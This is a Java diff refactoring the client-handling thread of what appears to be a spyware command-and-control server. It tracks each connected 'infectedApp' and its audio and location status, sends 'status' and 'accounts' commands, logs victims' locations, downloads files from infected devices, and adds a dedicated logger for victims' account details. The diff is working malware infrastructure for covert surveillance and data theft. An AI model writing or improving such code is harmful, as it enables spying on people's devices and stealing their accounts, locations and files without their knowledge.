@@ -11,7 +11,7 @@ public class ClientThread implements Runnable {
 
     private static final int SO_TIMEOUT = 60000;
 
-    private Logger logger, locationLogger;
+    private Logger logger, locationLogger, userLogger;
     private Socket socket = null;
     private DataInputStream in;
     private DataOutputStream out;
@@ -23,7 +23,7 @@ public class ClientThread implements Runnable {
     private String lastLocation;
     private ArrayList<String> accountNames = new ArrayList<String>();
     private ArrayList<String> emailAddresses = new ArrayList<String>();
-    private boolean listen = true;
+    private boolean listen;
 
     public ClientThread(Socket socket, String wifiStatus, String audioStarted, String locationStarted, String clientID, String version, String infectedApp) {
         // initiate thread
@@ -31,10 +31,12 @@ public class ClientThread implements Runnable {
         this.version = version;
         this.infectedApp = infectedApp;
         this.socket = socket;
-        logger = new Logger(Main.LOG_TYPE_NORMAL, clientID);
-        locationLogger = new Logger(Main.LOG_TYPE_LOCATIONS, clientID);
+        listen = true;
+        logger = new Logger(Logger.LOG_TYPE_NORMAL, clientID);
+        locationLogger = new Logger(Logger.LOG_TYPE_LOCATIONS, clientID);
+        userLogger = new Logger(Logger.LOG_TYPE_USERS, clientID);
         threadPort = socket.getPort();
-        logger.log("new client connected from: " + socket.getRemoteSocketAddress() + " v" + version);
+        logger.log("New client connected from: " + socket.getRemoteSocketAddress() + " v" + version);
         File directory = new File(clientID);
         if (!directory.exists()) {
             if (!directory.mkdir()) {
@@ -46,37 +48,39 @@ public class ClientThread implements Runnable {
     @Override
     public void run() {
         try {
-            try {
-                socket.setSoTimeout(SO_TIMEOUT);
-                in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
-                out = new DataOutputStream(new DataOutputStream(socket.getOutputStream()));
+            socket.setSoTimeout(SO_TIMEOUT);
+            in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
+            out = new DataOutputStream(new DataOutputStream(socket.getOutputStream()));
 
-                // request client status
-                say("status");
-                say("accounts");
+            // Request client status
+            say("status");
+            say("accounts");
 
-                // start heartbeat
-                heartbeat = new Heartbeat(out, clientID, ConnectionHandler.clientThreads.indexOf(this));
-                heartbeat.start();
+            // Start heartbeat
+            heartbeat = new Heartbeat(out);
+            heartbeat.start();
 
-                while (listen) {
-                    // get header
-                    int header = in.readInt();
-                    // get size, we expect the next data ([25 - 28]) to contain an int
-                    int size = in.readInt();
-                    if (header == Protocol.MESSAGE) {
+            while (listen) {
+                // get header
+                int header = in.readInt();
+
+                // get size, we expect the next data ([25 - 28]) to contain an int
+                int size = in.readInt();
+                byte[] message;
+                switch(header){
+                    case Protocol.MESSAGE:
                         // here comes a message
-                        byte[] message = new byte[size];
+                        message = new byte[size];
                         in.readFully(message, 0, message.length);
-                        String strMessage = new String(message, "UTF-8");
-                        handleMessage(strMessage);
-                    } else if (header == Protocol.FILE) {
-                        // here comes a logFile
+                        handleMessage(new String(message, "UTF-8"));
+                        break;
+                    case Protocol.FILE:
+                        // here comes a file
                         // start progress tracker on last commandline
                         ProgressHandler progress = new ProgressHandler(clientID, size, in);
                         progress.start();
                         try {
-                            // download the logFile
+                            // download the file
                             int bytesRead = 0;
                             byte[] file = new byte[size];
                             while (bytesRead < size) {
@@ -90,42 +94,15 @@ public class ClientThread implements Runnable {
                         } catch (IOException e) {
                             logger.log("Download failed");
                         }
-                    } else if (header == Protocol.HANDSHAKE) {
-                    } else {
+                        break;
+                    default:
                         logger.log("I don't understand the data. Quiting");
                         logger.log("header:     " + header);
                         logger.log("size:       " + size);
-                        byte[] message = new byte[size];
+                        message = new byte[size];
                         in.readFully(message, 0, message.length);
-                        String strMessage = new String(message, "UTF-8");
-                        logger.log("strMessage: " + strMessage);
-                        listen = false;
-                    }
+                        logger.log("strMessage: " + new String(message, "UTF-8"));
                 }
-            } finally {
-                if (heartbeat != null) {
-                    heartbeat.setRunning(false);
-                }
-                if (socket != null) {
-                    socket.close();
-                    socket = null;
-                }
-                if (in != null) {
-                    in.close();
-                    in = null;
-                }
-                if (out != null) {
-                    out.flush();
-                    out.close();
-                    out = null;
-                }
-                // notify user
-                StringBuilder sb = new StringBuilder();
-                sb.append("@ thread ");
-                sb.append(ConnectionHandler.clientThreads.indexOf(this));
-                sb.append(" has disconnected");
-                logger.log(sb.toString());
-                ConnectionHandler.clientThreads.remove(this);
             }
         } catch (SocketTimeoutException e) {
             logger.log("Connection timed out");
@@ -134,6 +111,32 @@ public class ClientThread implements Runnable {
         } catch (IOException e) {
             logger.log("IO Exception");
             e.printStackTrace();
+        } finally {
+            listen = false;
+            if (heartbeat != null) {
+                heartbeat.setRunning(false);
+            }
+            try {
+                if (in != null) {
+                    in.close();
+                }
+                if (out != null) {
+                    out.flush();
+                    out.close();
+                }
+                if (socket != null) {
+                    socket.close();
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            // Notify user
+            StringBuilder sb = new StringBuilder();
+            sb.append("@ thread ");
+            sb.append(ConnectionHandler.clientThreads.indexOf(this));
+            sb.append(" has disconnected");
+            logger.log(sb.toString());
+            ConnectionHandler.clientThreads.remove(this);
         }
     }
 
@@ -163,16 +166,8 @@ public class ClientThread implements Runnable {
             return;
         }
         if (message.startsWith("Account ")) {
-            String name = message.substring(
-                    message.indexOf("name=") + "name=".length(),
-                    message.indexOf(",")
-            );
-            if (!accountNames.contains(name)) {
-                accountNames.add(name);
-            }
-            if (name.contains("@") && name.contains(".") && !emailAddresses.contains(name)) {
-                emailAddresses.add(name);
-            }
+            userLogger.log(message);
+            return;
         }
         logger.log(message);
     }
@@ -190,7 +185,7 @@ public class ClientThread implements Runnable {
                     byte[] messageBytes = message.getBytes();
                     out.write(messageBytes, 0, messageBytes.length);
                     out.flush();
-                } catch (IOException e) {
+                } catch (Exception e) {
                     logger.log("IOException, could not send message: " + message);
                 }
             }
